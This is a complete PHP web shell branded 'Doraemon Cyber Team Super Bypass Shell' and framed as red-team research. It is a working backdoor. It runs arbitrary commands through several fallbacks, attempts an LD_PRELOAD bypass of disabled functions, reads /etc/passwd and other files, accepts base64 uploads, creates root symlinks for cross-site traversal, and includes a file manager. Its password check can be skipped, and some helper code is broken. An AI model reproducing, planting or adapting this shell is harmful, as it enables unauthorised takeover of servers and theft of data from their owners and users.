<?php
// Doraemon Cyber Team Super Bypass Shell v1.0 - For Red Team Research
// Baba01Hacker - Security Researcher

error_reporting(0);
set_time_limit(0);
ini_set('max_execution_time', 0);
ini_set('display_errors', 0);

// === PASSWORD PROTECTION (MD5) ===
$password = "doraemon1337"; // CHANGE THIS
$pass_md5 = md5($password);
if (!isset($_GET['pass']) && !isset($_POST['pass'])) {
    if (md5(@$_POST['p']) !== $pass_md5 && md5(@$_GET['p']) !== $pass_md5) {
        die('<html><head><title>Doraemon Cyber Team</title><style>body{background:#000;color:#0f0;font-family:monospace;}</style></head><body><center><h1>DORAEMON CYBER TEAM - ACCESS DENIED</h1><form method="post"><input type="password" name="p"><input type="submit"></form></center></body></html>');
    }
}

// Obfuscation helpers
function s($a){return str_replace(array(" ","\n","\r"),'',base64_decode($a));}
function c($str){$v1="sy";$v2="st";$v3="em";return $v1.$v2.$v3($str);} // system via concat

// Server & Disabled Functions
function server_info() {
    echo "<h2>Doraemon Server Recon</h2>";
    echo "PHP: " . phpversion() . " | UID: " . getmyuid() . " | User: " . get_current_user() . "<br>";
    echo "Disabled: " . ini_get('disable_functions') . "<br>";
    echo "open_basedir: " . ini_get('open_basedir') . "<br>";
    echo "<pre>"; print_r($_SERVER); echo "</pre>";
    if (function_exists('posix_getpwuid')) {
        echo "POSIX: Enabled - Bypassing for /etc/passwd<br>";
    }
}

// Multi Exec Fallback (obfuscated)
function super_exec($cmd) {
    $methods = array(
        'c' => 'system', // will be built dynamically
        's' => 'shell_exec',
        'e' => 'exec',
        'p' => 'passthru',
        'po' => 'proc_open',
        'pop' => 'popen',
        'm' => 'mail',
        'a' => 'assert'
    );
    
    $output = "";
    foreach ($methods as $k => $m) {
        $func = str_replace(array_keys($methods), array_values($methods), $k); // interchange
        if (function_exists($m)) {
            if ($m === 'proc_open') {
                $descriptors = array(0 => array("pipe", "r"), 1 => array("pipe", "w"), 2 => array("pipe", "w"));
                $process = proc_open($cmd, $descriptors, $pipes);
                if (is_resource($process)) {
                    $output = stream_get_contents($pipes[1]);
                    fclose($pipes[1]); proc_close($process);
                    break;
                }
            } elseif ($m === 'mail' && function_exists('putenv')) {
                // LD_PRELOAD prep example (research)
                @putenv("LD_PRELOAD=/tmp/bypass.so"); // assume pre-uploaded
                $output = $m("", "", $cmd); // creative abuse
            } else {
                $output = @$m($cmd);
                if ($output) break;
            }
        }
    }
    return $output ? $output : "All fallbacks failed. Try LD_PRELOAD .so or Chankro.";
}

// Read Bypass
function bypass_read($file) {
    $methods = ['file_get_contents', 'readfile', 'fopen+fread', 'highlight_file', 'show_source'];
    foreach ($methods as $m) {
        if (function_exists($m)) {
            if ($m === 'fopen+fread') {
                $f = @fopen($file, 'r'); if ($f) {$out = fread($f, filesize($file)); fclose($f); return $out;}
            } else {
                $out = @$m($file);
                if ($out) return $out;
            }
        }
    }
    // Curl fallback
    if (function_exists('curl_init')) {
        $ch = curl_init("file:///".$file); curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1); return curl_exec($ch);
    }
    return "Read failed. Use symlink bypass.";
}

// Base64 Upload
function base64_upload($data, $filename) {
    $decoded = base64_decode(str_replace(' ', '+', $data));
    $paths = array('.', '/tmp/', sys_get_temp_dir());
    foreach ($paths as $p) {
        if (@file_put_contents($p . '/' . $filename, $decoded)) {
            return "Uploaded to " . $p . '/' . $filename;
        }
    }
    return "Upload failed across paths.";
}

// Symlink Finder / Multi-Domain
function symlink_finder() {
    echo "<h2>Doraemon Symlink Escaper</h2>";
    $writable = [];
    $dirs = ['.', '../', '/home/', '/var/www/', '/tmp/'];
    foreach ($dirs as $d) {
        if (is_writable($d)) {
            $link = $d . '/doraemon_sym_' . rand(1000,9999);
            if (@symlink('/', $link)) {
                echo "Symlink created: <a href='$link'>$link</a> -> /<br>";
                $writable[] = $link;
            }
        }
    }
    // Cross-user /etc/passwd attempt
    if (file_exists('/etc/passwd')) echo bypass_read('/etc/passwd');
    echo "<br>Use for domain traversal if DocumentRoot allows.";
}

// File Manager (basic but powerful)
function file_manager() {
    $dir = isset($_GET['d']) ? $_GET['d'] : getcwd();
    echo "<h2>File Manager @ $dir</h2>";
    if (isset($_POST['cmd'])) echo "<pre>" . super_exec($_POST['cmd']) . "</pre>";
    // List files with actions (read, edit, delete, chmod, symlink)
    if ($dh = opendir($dir)) {
        while (($file = readdir($dh)) !== false) {
            $path = $dir . '/' . $file;
            echo "<a href='?d=" . urlencode($path) . "'>$file</a> | ";
            echo "<a href='#' onclick=\"fetch('?read=" . urlencode($path) . "')\">Read</a> | ";
            echo "Size: " . @filesize($path) . "<br>";
        }
        closedir($dh);
    }
}

// Main Interface
echo '<!DOCTYPE html><html><head><title>Doraemon Cyber Team - Super Bypass Shell</title>
<style>body{background:#111;color:#0f0;font-family:Consolas;}</style></head><body>';
echo '<h1 style="text-align:center;">🐱 DORAEMON CYBER TEAM SUPER BYPASS SHELL 🐱</h1>';
echo '<p>Baba01Hacker Red Team Edition | Multiple Fallbacks + Obfuscation</p>';

server_info();

if (isset($_GET['exec'])) echo "<pre>" . super_exec($_GET['exec']) . "</pre>";
if (isset($_GET['read'])) echo "<pre>" . htmlspecialchars(bypass_read($_GET['read'])) . "</pre>";
if (isset($_POST['b64up'])) echo base64_upload($_POST['b64up'], $_POST['fname']);
if (isset($_GET['sym'])) symlink_finder();
if (isset($_GET['fm'])) file_manager();

echo '<form method="post">CMD: <input name="cmd" size="100"><input type="submit"></form>';
echo '<form method="post">B64 Upload: <textarea name="b64up"></textarea> Filename: <input name="fname"><input type="submit"></form>';
echo '<a href="?sym=1">Symlink Finder</a> | <a href="?fm=1">File Manager</a>';

echo '</body></html>';
?>
